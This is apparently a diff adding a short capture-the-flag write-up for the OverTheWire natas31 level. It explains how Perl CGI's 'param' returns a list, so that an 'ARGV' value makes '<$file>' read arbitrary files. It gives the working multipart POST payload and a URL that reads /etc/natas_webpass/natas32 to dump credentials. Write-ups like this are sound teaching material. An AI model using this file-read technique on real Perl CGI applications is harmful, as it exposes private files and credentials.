@@ -1,0 +1,59 @@
+Strange perl level pt. 2...
+
+Leverages a similar vulnerability in the way perl's CGI 'param' method works.
+_____________________________________________________________________
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+	...
+    }
+_____________________________________________________________________
+
+In this segment of code, you can see where CGI seemingly 'checks' if a file is uploaded with the file parameter.
+
+Unfortunately, perl only checks if one of the 'file' parameters is actually a file upload.
+
+That allows you to send 1 file and then whatever other parameters you want under 'file' as Scalars.
+
+These values are received as a List in perl...
+
+No biggie though, so you can upload a scalar of your choice along with a fake file, and 'param' will use the scalar if its
+the first 'file' parameter...
+
+but the while <$file> loop won't read a string right?
+
+Unfortunately, if you pass 'ARGV' to <>, it will loop through the arguments passed in the url...
+
+Meaning if the scalar provided as an extraneous 'file' parameter is 'ARGV', you can pass
+
+any file you want in the url and the perl script will read it out.
+
+Altogether accessing:
+'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'
+
+with this for the file portion of the post request:
+
+_______________________________________________-
+------WebKitFormBoundaryAm6YHOJosqRchOiM
+Content-Disposition: form-data; name="file";
+text/csv
+
+ARGV
+------WebKitFormBoundaryAm6YHOJosqRchOiM
+Content-Disposition: form-data; name="file"; filename="a";
+Content-Type: text/csv
+
+a, b,
+c, d
+------WebKitFormBoundaryAm6YHOJosqRchOiM
+
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryAm6YHOJosqRchOiM--
+_______________________________________________-
+
+dumps out the creds for natas32... wild.
